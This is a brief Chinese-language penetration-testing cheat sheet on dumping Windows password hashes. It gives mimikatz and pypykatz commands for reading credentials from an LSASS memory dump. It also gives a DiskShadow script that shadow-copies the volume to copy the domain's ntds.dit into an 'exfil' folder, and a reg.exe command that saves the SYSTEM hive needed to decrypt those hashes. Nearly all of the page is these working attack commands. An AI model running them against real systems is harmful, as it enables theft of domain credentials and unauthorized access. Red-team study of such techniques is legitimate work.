# 密码和hash

讲解了各种方式的文章：

https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/

## isass内存转储

可以lsass.exe内存转储成lsass.dmp，再拿minidump读取即可。（也可以拿pypykatz替代）

```shell
sekurlsa::minidump lsass.dmp
sekurlsa::logonPasswords full
```



```shell
pypykatz lsa minidump lsass.dmp
```

## DiskShadow

需要根据情况修改：

```shell
set context persistent nowriters
add volume c: alias someAlias
create
expose %someAlias% z:
exec "cmd.exe" /c copy z:\windows\ntds\ntds.dit c:\exfil\ntds.dit
delete shadows volume %someAlias%
reset
```

```shell
diskshadow.exe /s .\script.txt
```



还应复制 SYSTEM 注册表配置单元，因为它包含解密 NTDS 文件内容的密钥：

```shell
	reg.exe save hklm\system c:\exfil\system.bak
```



如果ntds.dit因为正在使用无法读取，需要用diskshadow，具体参考https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/和本文件的Backup Operator组提权部分。



